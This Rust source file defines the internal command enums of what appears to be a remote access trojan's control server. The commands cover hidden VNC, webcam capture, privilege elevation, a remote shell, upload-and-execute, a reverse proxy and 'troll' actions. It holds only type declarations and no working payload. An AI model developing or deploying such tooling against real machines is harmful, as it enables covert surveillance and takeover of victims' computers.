/// Commands used internally for communication between connections and channel loop
use common::packets::*;
use std::net::SocketAddr;

use crate::utils::logger::Log;
use tauri::AppHandle;
use tokio::sync::{mpsc::Sender, oneshot::Sender as OSender};

use common::client_info::ClientInfo;

/// Commands sent to client-server connection handlers.
#[derive(Debug)]
pub enum ClientCommand {
    Write(ClientboundPacket),
    SetSecret(Option<Vec<u8>>),
    Close,
}

/// Commands sent to server-client connection handlers.
#[derive(Debug)]
pub enum ServerCommand {
    EncryptionRequest(Sender<ClientCommand>, OSender<Vec<u8>>),
    EncryptionConfirm(
        Sender<ClientCommand>,
        OSender<Result<Vec<u8>, ()>>,
        Vec<u8>,
        Vec<u8>,
        Vec<u8>,
    ),
    RegisterClient(Sender<ClientCommand>, SocketAddr, ClientInfo),

    TakeScreenshot(SocketAddr, String),
    ScreenshotData(SocketAddr, ScreenshotData),

    DisconnectClient(SocketAddr),
    ReconnectClient(SocketAddr),
    Log(Log),

    StartRemoteDesktop(SocketAddr, RemoteDesktopConfig),
    StopRemoteDesktop(SocketAddr),
    MouseClick(SocketAddr, MouseClickData),
    KeyboardInput(SocketAddr, KeyboardInputData),
    RemoteDesktopFrame(SocketAddr, RemoteDesktopFrame),

    GetClients(OSender<Vec<ClientInfo>>),
    GetClient(SocketAddr, OSender<Option<ClientInfo>>),
    SetTauriHandle(AppHandle),
    ClientDisconnected(SocketAddr),
    CloseClientSessions(),

    VisitWebsite(SocketAddr, VisitWebsiteData),

    ShowMessageBox(SocketAddr, MessageBoxData),

    ElevateClient(SocketAddr),

    ManageSystem(SocketAddr, String),

    GetProcessList(SocketAddr),
    ProcessList(SocketAddr, ProcessList),
    KillProcess(SocketAddr, Process),
    SuspendProcess(SocketAddr, Process),
    ResumeProcess(SocketAddr, Process),
    StartProcess(SocketAddr, String),

    StartShell(SocketAddr),
    ExitShell(SocketAddr),
    ShellCommand(SocketAddr, String),
    ShellOutput(SocketAddr, String),

    PreviousDir(SocketAddr),
    ViewDir(SocketAddr, String),
    AvailableDisks(SocketAddr),
    RemoveDir(SocketAddr, String),
    RemoveFile(SocketAddr, String),
    DownloadFile(SocketAddr, String),

    DisksResult(SocketAddr, Vec<String>),
    FileList(SocketAddr, Vec<File>),
    CurrentFolder(SocketAddr, String),
    DownloadFileResult(SocketAddr, FileData),

    StartReverseProxy(SocketAddr, String, String),
    StopReverseProxy(SocketAddr),

    RequestWebcam(SocketAddr),
    WebcamResult(SocketAddr, Vec<u8>),

    StartHVNC(SocketAddr),
    StopHVNC(SocketAddr),
    OpenExplorer(SocketAddr),
    HVNCFrame(SocketAddr, Vec<u8>),
  
    UploadAndExecute(SocketAddr, FileData),
    ExecuteFile(SocketAddr, String),
    UploadFile(SocketAddr, String, FileData),

    HandleTroll(SocketAddr, TrollCommand),
}
